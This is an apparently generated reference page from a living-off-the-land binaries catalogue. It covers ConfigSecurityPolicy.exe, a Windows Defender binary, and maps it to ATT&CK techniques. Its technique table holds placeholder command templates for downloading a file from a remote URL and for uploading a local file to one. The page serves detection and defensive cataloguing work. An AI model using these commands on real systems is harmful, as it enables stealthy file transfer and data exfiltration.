---
parsed_by: focuslocust
source: lolbas
type: generated
---
# ConfigSecurityPolicy.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `configsecuritypolicy.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/ConfigSecurityPolicy.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/configsecuritypolicy.md)
- Source verification: [source record](../../sources/lolbas/configsecuritypolicy.exe.md)

## Aliases

- `ConfigSecurityPolicy.exe`
- `configsecuritypolicy.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: ConfigSecurityPolicy.exe {REMOTEURL} |
| [T1567 - Exfiltration Over Web Service](../../attack/techniques/T1567-exfiltration-over-web-service.md) | explicit | source | Command metadata lists T1567: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/configsecuritypolicy.exe.md)

## Source Verification

[source record](../../sources/lolbas/configsecuritypolicy.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@NtSetDefault'
Person: Ialle Teixeira
- Handle: '@C_h4ck_0'
Person: Nir Chako (Pentera)
Author: Ialle Teixeira
Commands:
- Category: Upload
```
